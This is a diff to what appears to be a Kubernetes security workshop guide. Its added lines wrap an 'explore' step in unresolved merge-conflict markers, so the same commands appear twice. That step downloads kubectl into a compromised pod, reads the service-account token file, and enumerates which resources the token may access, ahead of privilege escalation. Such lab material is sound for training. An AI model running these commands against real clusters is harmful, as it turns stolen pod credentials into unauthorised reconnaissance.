@@ -75,9 +75,16 @@ kubectl apply -f 02-deployment/01-rce-deployment-bad.yaml
   ```
 - explore ..
    ```
+<<<<<<< HEAD
   curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.5/bin/linux/amd64/kubectl && chmod 700 kubectl
 
   for i in $(./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server='https://kubernetes.default.svc.cluster.local' api-resources --verbs=get | awk '{print $1}'); do ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server='https://kubernetes.default.svc.cluster.local' auth can-i get $i ; done
+=======
+   curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.5/bin/linux/amd64/kubectl && chmod 700 kubectl
+ 
+for i in $(./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server='https://kubernetes.default.svc.cluster.local' api-resources --verbs=get | awk '{print $1}'); do ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server='https://kubernetes.default.svc.cluster.local' auth can-i get $i ; done
+
+>>>>>>> 826ead3794c26e2b70838fe4d0716a7b370af209
    ```
  
 6. Elevate permissions
